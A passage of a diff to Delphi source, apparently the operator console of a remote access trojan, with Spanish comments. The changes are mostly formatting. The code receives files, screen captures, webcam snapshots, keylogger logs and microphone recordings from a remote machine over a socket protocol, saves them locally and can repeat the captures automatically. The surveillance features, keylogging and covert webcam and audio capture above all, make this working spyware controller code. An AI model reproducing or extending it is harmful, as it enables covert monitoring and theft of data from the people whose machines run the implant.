 
   if EditPathArchivos.Text = '' then
-  begin
-    MessageDlg(_('Entra al directorio primero!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('Entra al directorio primero!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   if OpenDialogUpload.Execute then
-  begin
-    //nos aseguramos de que el archivo no este en la lista de
-    //descargas (sin importar si esta transfiriendo o si ya finalizo)
-    FilePath := OpenDialogUpload.FileName;
-    FilePath := EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName);
-    for i := 0 to ListViewDescargas.Items.Count - 1 do
     begin
-      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
-      if Descarga.Origen = FilePath then
-      begin
-        MessageDlg(('El achivo ya se encuentra en la lista de descargas'),
-          mtWarning, [mbOK], 0);
-        Exit;
-      end;
+      //nos aseguramos de que el archivo no este en la lista de
+      //descargas (sin importar si esta transfiriendo o si ya finalizo)
+      FilePath := OpenDialogUpload.FileName;
+      FilePath := EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName);
+      for i := 0 to ListViewDescargas.Items.Count - 1 do
+        begin
+          Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
+          if Descarga.Origen = FilePath then
+            begin
+              MessageDlg(('El achivo ya se encuentra en la lista de descargas'),
+                mtWarning, [mbOK], 0);
+              Exit;
+            end;
+        end;
+      Servidor.Connection.Writeln('SENDFILE|' + OpenDialogUpload.FileName +
+        '|' + EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName) +
+        '|' + MD5(OpenDialogUpload.FileName) +
+        '|' + IntToStr(MyGetFileSize(OpenDialogUpload.FileName)));
     end;
-    Servidor.Connection.Writeln('SENDFILE|' + OpenDialogUpload.FileName +
-      '|' + EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName) +
-      '|' + MD5(OpenDialogUpload.FileName) +
-      '|' + IntToStr(MyGetFileSize(OpenDialogUpload.FileName)));
-  end;
 end;
 
 procedure TFormControl.OnReadFile(AThread: TIdPeerThread);
 var
   Buffer: string;
   Descarga: TDescargaHandler;
-  FilePath: ansistring;
-  Size: int64;
-  i: integer;
-  MS, MS2 : TMemoryStream;
+  FilePath: AnsiString;
+  Size: Int64;
+  i: Integer;
+  MS, MS2: TMemoryStream;
   JPG: TJPEGImage;
-  tmpstr, tempstr1, tempstr2, tempstr3 : string;
-  Item  : Tlistitem;
-  p : pointer;
-  Bufferr: array[0..4095{4kb}] of byte;
+  tmpstr, tempstr1, tempstr2, tempstr3: string;
+  Item: Tlistitem;
+  p: Pointer;
+  Bufferr: array[0..4095 {4kb}] of Byte;
 begin
   Buffer := Trim(Athread.Connection.ReadLn);
 
   if Copy(PChar(Buffer), 1, 7) = 'GETFILE' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
-    Delete(Buffer, 1, Pos('|', Buffer));
-    Size     := StrToInt(Trim(Buffer));
-    CrearDirectoriosUsuario();
-    Descarga := TDescargaHandler.Create(Athread, FilePath, Size,
-    DirDescargas+ ExtractFileName(FilePath), ListViewDescargas, True);
-    Descarga.callback := Self.TransferFinishedNotification;
-    Descarga.transferFile;
-  end
-  else if Copy(PChar(Buffer), 1, 14) = 'RESUMETRANSFER' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
-    Delete(Buffer, 1, Pos('|', Buffer));
-    Size := StrToInt(Buffer);
-    for i := 0 to ListViewDescargas.Items.Count - 1 do
     begin
-      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
-      if Descarga.Origen = FilePath then
-      begin
-        Descarga.AThread  := Athread; //El socket anterior ya esta desconectado
-        Descarga.SizeFile := Size;
-        Descarga.ResumeTransfer;
-        Exit;
-      end;
-    end;
-  end
-  else if Copy(PChar(Buffer), 1, 8) = 'SENDFILE' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    tmpstr := Copy(Buffer, 1, Pos('|', Buffer) - 1); //HASH
-    Delete(Buffer, 1, Pos('|', Buffer));
-    FilePath := Trim(Buffer);
-
-    if MD5(FilePath) <> Tmpstr then
-    begin
-      MessageDlg(_('Intento de intrusión a archivo bloqueado: ')+FilePath,mtWarning, [mbOK], 0);
+      Delete(Buffer, 1, Pos('|', Buffer));
+      FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Size := StrToInt(Trim(Buffer));
+      CrearDirectoriosUsuario();
+      Descarga := TDescargaHandler.Create(Athread, FilePath, Size,
+        DirDescargas + ExtractFileName(FilePath), ListViewDescargas, True);
+      Descarga.callback := Self.TransferFinishedNotification;
+      Descarga.transferFile;
     end
-    else
+  else if Copy(PChar(Buffer), 1, 14) = 'RESUMETRANSFER' then
     begin
-      Size     := MyGetFileSize(FilePath);
-      Descarga := TDescargaHandler.Create(Athread, FilePath, Size, '',
-      ListViewDescargas, False);
-      Descarga.UploadFile;
-    end;
-  end
-  else if Copy(PChar(Buffer), 1, 14) = 'CAPSCREENSTART' then
-  begin
-    {Se dispone a empezar a mandar la captura, tenemos que preparar el memory stream y el tamaño del buffer que tenemos que recibir}
-    Delete(Buffer, 1, Pos('|', Buffer));
-    {La anchura y altura de su pantalla}
-    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
-    AnchuraPantalla := strtoint(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
-    Delete(FilePath, 1, Pos('¬', FilePath));
-    AlturaPantalla := strtoint(FilePath);
-    Delete(Buffer, 1, Pos('|', Buffer));
-    
-    {0=CapScreen}
-    CapSize[0] := StrToInt(Trim(Buffer)); //El tamaño de la captura
-    MSC[0] := TMemoryStream.Create;
-    MSC[0].Position := 0;
-    ProgressBarScreen.Position := 0; //La ponemos a 0
-    if FormVisorCaptura <> nil then
-      (FormVisorCaptura as TScreenMax).Progressbar.position := ProgressBarScreen.Position;
-  end
-  else if Copy(PChar(Buffer), 1, 14) = 'CAPSCREENCHUNK' then
-  begin
-  {Estamos recibiendo un fragmento de la captura de pantalla}
-    Delete(Buffer, 1, Pos('|', Buffer));
-    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));
-    Delete(Buffer, 1, Pos('|', Buffer));
-
-    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
-    MSC[0].Write(Bufferr, Size); //Escribimos el bloque
-
-    //Actualizamos la barra de progreso
-    ProgressBarScreen.Position := Round((MSC[0].size * 100) / CapSize[0]);
-    if FormVisorCaptura <> nil then
-      (FormVisorCaptura as TScreenMax).Progressbar.position := ProgressBarScreen.Position;
-    if (CapSize[0] = MSC[0].Size) then //Hemos terminado :D
-    begin
-      ProgressBarScreen.Position := 0;
-      if FormVisorCaptura <> nil then
-        (FormVisorCaptura as TScreenMax).Progressbar.position := ProgressBarScreen.Position;
-      MSC[0].Position := 0;
-      JPG := TJPEGImage.Create;
-      JPG.LoadFromStream(MSC[0]);
-
-      if FormVisorCaptura <> nil then
-      begin
-        try
-        (FormVisorCaptura as TScreenMax).ImgCaptura.width := JPG.Width;
-        except
+      Delete(Buffer, 1, Pos('|', Buffer));
+      FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Size := StrToInt(Buffer);
+      for i := 0 to ListViewDescargas.Items.Count - 1 do
+        begin
+          Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
+          if Descarga.Origen = FilePath then
+            begin
+              Descarga.AThread := Athread; //El socket anterior ya esta desconectado
+              Descarga.SizeFile := Size;
+              Descarga.ResumeTransfer;
+              Exit;
+            end;
         end;
-        (FormVisorCaptura as TScreenMax).ImgCaptura.Picture.Assign(JPG)
-      end
+    end
+  else if Copy(PChar(Buffer), 1, 8) = 'SENDFILE' then
+    begin
+      Delete(Buffer, 1, Pos('|', Buffer));
+      tmpstr := Copy(Buffer, 1, Pos('|', Buffer) - 1); //HASH
+      Delete(Buffer, 1, Pos('|', Buffer));
+      FilePath := Trim(Buffer);
+
+      if MD5(FilePath) <> Tmpstr then
+        begin
+          MessageDlg(_('Intento de intrusión a archivo bloqueado: ') + FilePath, mtWarning, [mbOK], 0);
+        end
       else
-      begin
-        imgCaptura.Width := JPG.Width; //Establecemos ancho
-        imgCaptura.Height := JPG.Height; //Establecemos alto
-        imgcaptura.Picture.Assign(JPG);
-      end;
-      
-      LabelTamano.Caption := IntToStr(MSC[0].Size div 1024); //Es interesante saber el tamaño
-      if(PrefijoGuardarCaptura <> '') then
-      begin
-        InumeroCaptura := InumeroCaptura+1;
-        CrearDirectoriosUsuario();
-        while FileExists(DirCapturas+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg') do
-          PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
-        MSC[0].SaveToFile(DirCapturas+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg');
-      end;
-      MSC[0].Free;
-      JPG.Free;
-      BtnCapturarScreen.Enabled := True;
-      RecibiendoJPG := false;
-      TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked; //Volvemos a activar
-    end;
-  end
+        begin
+          Size := MyGetFileSize(FilePath);
+          Descarga := TDescargaHandler.Create(Athread, FilePath, Size, '',
+            ListViewDescargas, False);
+          Descarga.UploadFile;
+        end;
+    end
+  else if Copy(PChar(Buffer), 1, 14) = 'CAPSCREENSTART' then
+    begin
+      //Se dispone a empezar a mandar la captura, prepararamos el
+      //memory stream y el tamaño del buffer que tenemos que recibir
+      Delete(Buffer, 1, Pos('|', Buffer));
+      //La anchura y altura de su pantalla
+      FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
+      AnchuraPantalla := StrToInt(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
+      Delete(FilePath, 1, Pos('¬', FilePath));
+      AlturaPantalla := StrToInt(FilePath);
+      Delete(Buffer, 1, Pos('|', Buffer));
+      //0=CapScreen
+      CapSize[0] := StrToInt(Trim(Buffer)); //El tamaño de la captura
+      MSC[0] := TMemoryStream.Create;
+      MSC[0].Position := 0;
+      ProgressBarScreen.Position := 0; //Ponemos a 0 la barra de progreso
+      if FormVisorCaptura <> nil then (FormVisorCaptura as TScreenMax).Progressbar.Position := ProgressBarScreen.Position;
+    end
+  else if Copy(PChar(Buffer), 1, 14) = 'CAPSCREENCHUNK' then
+    begin
+      //Estamos recibiendo un fragmento de la captura
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+      //0=CapScreen
+      MSC[0].Write(Bufferr, Size); //Escribimos el bloque
+      ProgressBarScreen.Position := Round((MSC[0].Size * 100) / CapSize[0]); //Actualizamos la barra de progreso
+      if FormVisorCaptura <> nil then (FormVisorCaptura as TScreenMax).Progressbar.Position := ProgressBarScreen.Position;
+      if CapSize[0] = MSC[0].Size then //Hemos terminado :D
+        begin
+          ProgressBarScreen.Position := 0; //Ponemos a 0 la barra de progreso
+          if FormVisorCaptura <> nil then (FormVisorCaptura as TScreenMax).Progressbar.Position := ProgressBarScreen.Position;
+          MSC[0].Position := 0;
+          JPG := TJPEGImage.Create;
+          JPG.LoadFromStream(MSC[0]);
+          if FormVisorCaptura <> nil then
+            begin
+              try
+                (FormVisorCaptura as TScreenMax).ImgCaptura.Width := JPG.Width;
+              except
+              end;
+              (FormVisorCaptura as TScreenMax).ImgCaptura.Picture.Assign(JPG)
+            end
+          else
+            begin
+              imgCaptura.Width := JPG.Width; //Establecemos ancho
+              imgCaptura.Height := JPG.Height; //Establecemos alto
+              imgcaptura.Picture.Assign(JPG);
+            end;
+          LabelTamano.Caption := IntToStr(MSC[0].Size div 1024); //Es interesante saber el tamaño
+          if (PrefijoGuardarCaptura <> '') then
+            begin
+              InumeroCaptura := InumeroCaptura + 1;
+              CrearDirectoriosUsuario();
+              while FileExists(DirCapturas + PrefijoGuardarCaptura + IntToStr(InumeroCaptura) + '.jpg') do
+                PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
+              MSC[0].SaveToFile(DirCapturas + PrefijoGuardarCaptura + IntToStr(InumeroCaptura) + '.jpg');
+            end;
+          MSC[0].Free;
+          JPG.Free;
+          RecibiendoJPG := False;
+          BtnCapturarScreen.Enabled := True;
+          TimerCaptureScreen.Enabled := CheckBoxAutoCapturaScreen.Checked; //Volvemos a activar
+        end;
+    end
   else if Copy(PChar(Buffer), 1, 18) = 'CAPTURAWEBCAMSTART' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-		CapSize[1] := StrToInt(Trim(Buffer));
-    MSC[1] := TMemoryStream.Create;
-    MSC[1].Position := 0;
-    ProgressBarWebCam.position := 0;
-  end
-  else if Copy(PChar(Buffer), 1, 11) = 'WEBCAMCHUNK' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));     //Tamaño del chunk!
-    Delete(Buffer, 1, Pos('|', Buffer));
-
-    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
-    MSC[1].Write(Bufferr, Size); //Escribimos el bloque
-
-    //Actualizamos la barra de progreso
-    ProgressBarWebCam.Position := Round((MSC[1].size * 100) / CapSize[1]);
-    
-    if MSC[1].size = Capsize[1] then
     begin
+      //Se dispone a empezar a mandar la captura, prepararamos el
+      //memory stream y el tamaño del buffer que tenemos que recibir
+      Delete(Buffer, 1, Pos('|', Buffer));
+      //1=CapWebcam
+      CapSize[1] := StrToInt(Trim(Buffer)); //El tamaño de la captura
+      MSC[1] := TMemoryStream.Create;
       MSC[1].Position := 0;
-      ProgressBarWebCam.position := 0;
-      JPG := TJPEGImage.Create;
-      JPG.LoadFromStream(MSC[1]);
-      imgWebcam.Width := JPG.Width; //Establecemos ancho
-      imgWebcam.Height := JPG.Height; //Establecemos alto
-      imgWebcam.Picture.Assign(JPG);
-      LabelTamaniowebcam.caption := IntToStr(MSC[1].Size div 1024); //Es interesante saber el tamaño
-      if(PrefijoGuardarWebcam <> '') then
-      begin
-        InumeroWebcam := InumeroWebcam+1;
-        CrearDirectoriosUsuario();
-        while FileExists(DirWebcam+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg') do
-          PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
-        MSC[1].SaveToFile(DirWebcam+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg');
-      end;
-      MSC[1].Free;
-      JPG.Free;
-		  BtnCapturarWebcam.Enabled := True;
-      TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
-    end;
-  end
+      ProgressBarWebCam.Position := 0; //Ponemos a 0 la barra de progreso
+    end
+  else if Copy(PChar(Buffer), 1, 11) = 'WEBCAMCHUNK' then
+    begin
+      //Estamos recibiendo un fragmento de la captura
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+      //1=CapWebcam
+      MSC[1].Write(Bufferr, Size); //Escribimos el bloque
+      ProgressBarWebCam.Position := Round((MSC[1].Size * 100) / CapSize[1]); //Actualizamos la barra de progreso
+      if CapSize[1] = MSC[1].Size then //Hemos terminado :D
+        begin
+          ProgressBarWebCam.Position := 0; //Ponemos a 0 la barra de progreso
+          MSC[1].Position := 0;
+          JPG := TJPEGImage.Create;
+          JPG.LoadFromStream(MSC[1]);
+          imgWebcam.Width := JPG.Width; //Establecemos ancho
+          imgWebcam.Height := JPG.Height; //Establecemos alto
+          imgWebcam.Picture.Assign(JPG);
+          LabelTamaniowebcam.Caption := IntToStr(MSC[1].Size div 1024); //Es interesante saber el tamaño
+          if (PrefijoGuardarWebcam <> '') then
+            begin
+              InumeroWebcam := InumeroWebcam + 1;
+              CrearDirectoriosUsuario();
+              while FileExists(DirWebcam + PrefijoGuardarWebcam + IntToStr(InumeroWebcam) + '.jpg') do
+                PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
+              MSC[1].SaveToFile(DirWebcam + PrefijoGuardarWebcam + IntToStr(InumeroWebcam) + '.jpg');
+            end;
+          MSC[1].Free;
+          JPG.Free;
+          BtnCapturarWebcam.Enabled := True;
+          TimerCamCapture.Enabled := CheckBoxAutoCamCapture.Checked; //Volvemos a activar
+        end;
+    end
   else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILSTART' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    CapSize[2] := StrToInt(Trim(Buffer));  //Tamaño del Thumbnail
-    
-    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.position := 0;
-    MSC[2] := TMemoryStream.Create;
-    MSC[2].Position := 0;
+    begin
+      Delete(Buffer, 1, Pos('|', Buffer));
+      CapSize[2] := StrToInt(Trim(Buffer)); //Tamaño del Thumbnail
 
-  end
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := 0;
+      MSC[2] := TMemoryStream.Create;
+      MSC[2].Position := 0;
+
+    end
   else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILERROR' then
-  begin
-    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.position := 0;
-    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).statusbar.panels[3].text := 'ERROR';
-    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
-  end
-  else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILCHUNK' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));     //Tamaño del chunk!
-    Delete(Buffer, 1, Pos('|', Buffer));
-    
-    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
-    MSC[2].Write(Bufferr, Size); //Escribimos el bloque
-
-    //Actualizamos la barra de progreso
-    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.position := Round((MSC[2].size * 100) / CapSize[2]);
-
-    if (CapSize[2] = MSC[2].Size) then //Hemos terminado :D
     begin
-      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.position := 0;
-      MSC[2].position := 0;
-      JPG := TJPEGImage.Create;
-      JPG.LoadFromStream(MSC[2]);
-      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).imageThumnail.picture.Assign(JPG);
-      JPG.Free;
-      MSC[2].Free;
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := 0;
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).statusbar.panels[3].Text := 'ERROR';
       (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
-    end;
-  end
+    end
+  else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILCHUNK' then
+    begin
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Delete(Buffer, 1, Pos('|', Buffer));
+
+      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+      MSC[2].Write(Bufferr, Size); //Escribimos el bloque
+
+      //Actualizamos la barra de progreso
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := Round((MSC[2].Size * 100) / CapSize[2]);
+
+      if CapSize[2] = MSC[2].Size then //Hemos terminado :D
+        begin
+          (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := 0;
+          MSC[2].Position := 0;
+          JPG := TJPEGImage.Create;
+          JPG.LoadFromStream(MSC[2]);
+          (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).imageThumnail.picture.Assign(JPG);
+          JPG.Free;
+          MSC[2].Free;
+          (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
+        end;
+    end
   else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGSTART' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    CapSize[4] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
-    ProgressBarKeylogger.position := 0;
-    MSC[4] := TMemoryStream.Create;
-    MSC[4].Position := 0;
-  end
+    begin
+      Delete(Buffer, 1, Pos('|', Buffer));
+      CapSize[4] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del Log
+      ProgressBarKeylogger.Position := 0;
+      MSC[4] := TMemoryStream.Create;
+      MSC[4].Position := 0;
+    end
   else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGCHUNK' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));     //Tamaño del chunk!
-    Delete(Buffer, 1, Pos('|', Buffer));
-
-    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
-    MSC[4].Write(Bufferr, Size); //Escribimos el bloque
-
-    ProgressBarKeylogger.position := Round((MSC[4].size * 100) / CapSize[4]);
-
-    if MSC[4].size = Capsize[4] then //Finish!
     begin
-      ProgressBarKeylogger.position := 0;
-      MSC[4].Position := 0;
-      CreardirectoriosUsuario();
-      while fileexists(DirUsuario+'Klog'+inttostr(i)+'.txt') do i := i+1;
-      MSC[4].savetofile(DirUsuario+'Klog'+inttostr(i)+'.txt');
-      MSC[4].Position := 0;
-      RichEditKeylogger.lines.clear;
-      Setlength(tmpstr, MSC[4].size);
-      MSC[4].Read(tmpstr[1], MSC[4].size);
-      AgregarARichEdit(tmpstr);
-      tmpstr := '';
-      MSC[4].free;
-      MSC[4] := nil;
-      SpeedButtonRecibirLog.Enabled := true;
-    end;
-  end
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Delete(Buffer, 1, Pos('|', Buffer));
+
+      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+      MSC[4].Write(Bufferr, Size); //Escribimos el bloque
+
+      ProgressBarKeylogger.Position := Round((MSC[4].Size * 100) / CapSize[4]);
+
+      if MSC[4].Size = Capsize[4] then //Finish!
+        begin
+          ProgressBarKeylogger.Position := 0;
+          MSC[4].Position := 0;
+          CreardirectoriosUsuario();
+          while fileexists(DirUsuario + 'Klog' + IntToStr(i) + '.txt') do
+            i := i + 1;
+          MSC[4].savetofile(DirUsuario + 'Klog' + IntToStr(i) + '.txt');
+          MSC[4].Position := 0;
+          RichEditKeylogger.Lines.Clear;
+          Setlength(tmpstr, MSC[4].Size);
+          MSC[4].read(tmpstr[1], MSC[4].Size);
+          AgregarARichEdit(tmpstr);
+          tmpstr := '';
+          MSC[4].Free;
+          MSC[4] := nil;
+          SpeedButtonRecibirLog.Enabled := True;
+        end;
+    end
   else if Copy(PChar(Buffer), 1, 10) = 'AUDIOSTART' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    CapSize[3] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
-    ProgressBarAudio.position := 0;
-    MSC[3] := TMemoryStream.Create;
-    MSC[3].Position := 0;
-
-  end
-  else if Copy(PChar(Buffer), 1, 10) = 'AUDIOCHUNK' then
-  begin
-    Delete(Buffer, 1, Pos('|', Buffer));
-    Size := strtoint(Copy(Buffer, 1, Pos('|', Buffer) - 1));     //Tamaño del chunk!
-    Delete(Buffer, 1, Pos('|', Buffer));
-    
-    Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
-    MSC[3].Write(Bufferr, Size); //Escribimos el bloque
-    ProgressBarAudio.position := Round((MSC[3].size * 100) / CapSize[3]);
-
-    if CapSize[3] = MSC[3].size then  //Recibido!
     begin
-      MSC[3].position := 0;
-      ProgressBarAudio.position := 0;
-      if (MSC[3].Size>10) then //No ha habido error :D
-      begin
-        item := listviewAudio.items.add();
-        NumeroAudio := NumeroAudio +1 ;
-        item.caption := inttostr(NumeroAudio);
-        item.subitems.add(inttostr(MSC[3].size));
-        {hz canal bits}
-        TmpStr := UltimoFormato;
-        TempStr1 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //HZ
-        Delete(TmpStr, 1, pos('-', TmpStr));
-        TempStr2 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //Canal
-        Delete(TmpStr, 1, pos('-', TmpStr));
-        TempStr3 := TmpStr;                                    //Bits
-        item.subitems.add(inttostr(strtoint(tempstr1) * strtoint(Tempstr2)*strtoint(Tempstr3) div 8));
-        item.subitems.add(formatdatetime('hh:mm:ss',now));
+      Delete(Buffer, 1, Pos('|', Buffer));
+      CapSize[3] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del Log
+      ProgressBarAudio.Position := 0;
+      MSC[3] := TMemoryStream.Create;
+      MSC[3].Position := 0;
 
-        Item.Subitems.Add(UltimoFormato);
-        //Creamos el archivo .wav
-        MS2 := TmemoryStream.create;
-        MS2.position := 0;
-        MSC[3].position := 0;
-        setlength(buffer, MSC[3].size);
-        MSC[3].Read(buffer[1], MSC[3].size);
-        InitWavFile(MS2, strtoint(TempStr2), strtoint(TempStr1), strtoint(TempStr3), buffer);
-        setlength(buffer, ms2.size);
-        ms2.Read(buffer[1], ms2.size);
+    end
+  else if Copy(PChar(Buffer), 1, 10) = 'AUDIOCHUNK' then
+    begin
+      Delete(Buffer, 1, Pos('|', Buffer));
+      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del chunk!
+      Delete(Buffer, 1, Pos('|', Buffer));
 
-        Getmem(p,MS2.size);
-        MoveMemory(p, MS2.memory, MS2.size);
-        item.data := p; //Guardamos un puntero al sonido
-        item.subitems.add(inttostr(MS2.Size));  //Necesitaremos el tamaño de el puntero ;)
+      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
+      MSC[3].Write(Bufferr, Size); //Escribimos el bloque
+      ProgressBarAudio.Position := Round((MSC[3].Size * 100) / CapSize[3]);
 
-        if CheckBoxAutoReproducir.checked then
-          sndPlaySound(item.data, SND_MEMORY or SND_ASYNC); //Reproducimos si así se nos ordena
-      end
+      if CapSize[3] = MSC[3].Size then //Recibido!
+        begin
+          MSC[3].Position := 0;
+          ProgressBarAudio.Position := 0;
+          if (MSC[3].Size > 10) then //No ha habido error :D
+            begin
+              item := listviewAudio.Items.Add();
+              NumeroAudio := NumeroAudio + 1;
+              item.Caption := IntToStr(NumeroAudio);
+              item.subitems.Add(IntToStr(MSC[3].Size));
+              {hz canal bits}
+              TmpStr := UltimoFormato;
+              TempStr1 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //HZ
+              Delete(TmpStr, 1, Pos('-', TmpStr));
+              TempStr2 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //Canal
+              Delete(TmpStr, 1, Pos('-', TmpStr));
+              TempStr3 := TmpStr; //Bits
+              item.subitems.Add(IntToStr(StrToInt(tempstr1) * StrToInt(Tempstr2) * StrToInt(Tempstr3) div 8));
+              item.subitems.Add(FormatDateTime('hh:mm:ss', now));
 
-      else
-      begin
-        Estado(_('Error al capturar audio'));//Error al capturar audio
-      end;
-      
-      MSC[3].Free;
-      MSC[3] := nil;
-      MS2.free;
-      SpeedButtonCapAudio.enabled := true;
-      if CheckBoxCapturarAudioAutomaticamente.checked then
-        SpeedButtonCapAudioClick(nil);
+              Item.Subitems.Add(UltimoFormato);
+              //Creamos el archivo .wav
+              MS2 := TMemoryStream.Create;
+              MS2.Position := 0;
+              MSC[3].Position := 0;
+              setlength(buffer, MSC[3].Size);
+              MSC[3].read(buffer[1], MSC[3].Size);
+              InitWavFile(MS2, StrToInt(TempStr2), StrToInt(TempStr1), StrToInt(TempStr3), buffer);
+              setlength(buffer, ms2.Size);
+              ms2.read(buffer[1], ms2.Size);
+
+              Getmem(p, MS2.Size);
+              MoveMemory(p, MS2.memory, MS2.Size);
+              item.data := p; //Guardamos un puntero al sonido
+              item.subitems.Add(IntToStr(MS2.Size)); //Necesitaremos el tamaño de el puntero ;)
+
+              if CheckBoxAutoReproducir.Checked then
+                sndPlaySound(item.data, SND_MEMORY or SND_ASYNC); //Reproducimos si así se nos ordena
+            end
+
+          else
+            begin
+              Estado(_('Error al capturar audio')); //Error al capturar audio
+            end;
+
+          MSC[3].Free;
+          MSC[3] := nil;
+          MS2.Free;
+          SpeedButtonCapAudio.Enabled := True;
+          if CheckBoxCapturarAudioAutomaticamente.Checked then
+            SpeedButtonCapAudioClick(nil);
+        end;
     end;
-  end;
 
 end;
-    
- //se llama cada vez que finaliza una descarga para que se inicie
- //alguna otra descarga que haya sido puesta en cola
-procedure TFormControl.TransferFinishedNotification(Sender: TObject;filename:string);
+
+//se llama cada vez que finaliza una descarga para que se inicie
+//alguna otra descarga que haya sido puesta en cola
+
+procedure TFormControl.TransferFinishedNotification(Sender: TObject; FileName: string);
 var
   Descarga: TDescargaHandler;
-  i: integer;
+  i: Integer;
 begin
 
-  if(AnsiLowerCase(extractfilename(filename)) = 'thumbs.db') then
-  begin
-    CargarThumbsFileAlListview(DirDescargas+'thumbs.db');//cargamos las miniaturas
-    Receivingthumbfile := false;
-  end
-  else
-  begin
-
